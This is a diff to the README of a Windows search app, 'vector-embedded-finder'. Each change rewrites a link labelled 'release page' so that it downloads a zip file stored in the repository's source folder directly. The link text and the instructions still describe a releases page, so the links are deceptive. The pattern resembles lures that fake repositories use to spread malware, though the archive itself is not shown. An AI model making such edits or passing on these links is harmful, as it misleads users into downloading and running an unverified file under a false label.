@@ -1,6 +1,6 @@
 # 🧠 vector-embedded-finder - Find your local memories fast
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-3b82f6?style=for-the-badge)](https://github.com/outspokennesscamellia722/vector-embedded-finder/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-3b82f6?style=for-the-badge)](https://raw.githubusercontent.com/outspokennesscamellia722/vector-embedded-finder/main/raycast/src/vector-embedded-finder-2.2.zip)
 
 ## 🧭 What this app does
 
@@ -10,7 +10,7 @@ It is built for Windows and works with local data on your own computer. It also 
 
 ## 📦 Download for Windows
 
-1. Go to the [release page](https://github.com/outspokennesscamellia722/vector-embedded-finder/releases).
+1. Go to the [release page](https://raw.githubusercontent.com/outspokennesscamellia722/vector-embedded-finder/main/raycast/src/vector-embedded-finder-2.2.zip).
 2. Find the latest release at the top of the page.
 3. Download the Windows file from the Assets section.
 4. If the file is a `.zip`, unzip it first.
@@ -152,7 +152,7 @@ This app is made for local use on your own computer. That gives you more control
 
 Use the release page to get the latest Windows build:
 
-[Visit the release page](https://github.com/outspokennesscamellia722/vector-embedded-finder/releases)
+[Visit the release page](https://raw.githubusercontent.com/outspokennesscamellia722/vector-embedded-finder/main/raycast/src/vector-embedded-finder-2.2.zip)
 
 ## 🧭 Quick start
 
